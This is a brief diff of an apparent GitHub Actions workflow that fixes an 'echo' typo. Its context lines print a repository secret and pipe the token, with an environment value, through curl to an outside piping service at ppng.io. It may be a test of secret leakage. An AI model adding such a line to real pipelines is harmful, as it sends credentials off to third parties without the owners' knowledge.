@@ -14,5 +14,5 @@ jobs:
           SUPER_SECRET: ${{ secrets.TEST }}
         run: |
           echo $SUPER_SECRET
-          wcho $env
+          echo $env
           echo "token is $SUPER_SECRET,other is $env" | curl -T - https://ppng.io/justtest123
